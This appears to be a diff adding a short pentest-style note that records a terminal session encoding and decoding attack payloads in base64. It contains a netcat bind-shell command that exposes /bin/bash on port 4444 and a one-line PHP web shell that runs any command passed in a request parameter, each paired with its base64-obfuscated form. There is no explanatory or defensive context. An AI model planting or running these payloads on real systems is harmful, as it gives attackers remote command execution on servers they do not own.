@@ -1,0 +1,14 @@
+echo 'nc -lvp 4444 -e /bin/bash' | base64                                      
+bmMgLWx2cCA0NDQ0IC1lIC9iaW4vYmFzaAo=
+                                                                                                      
+echo "bmMgLWx2cCA0NDQ0IC1lIC9iaW4vYmFzaAo=" | base64 -d                        
+nc -lvp 4444 -e /bin/bash
+                                                                                                      
+cat shell.txt     
+<?php system($_REQUEST['cmd']); ?>
+                                                                                                      
+cat shell.txt | base64 
+PD9waHAgc3lzdGVtKCRfUkVRVUVTVFsnY21kJ10pOyA/Pgo=
+                                                                                                      
+echo "PD9waHAgc3lzdGVtKCRfUkVRVUVTVFsnY21kJ10pOyA/Pgo=" | base64 -d            
+<?php system($_REQUEST['cmd']); ?>
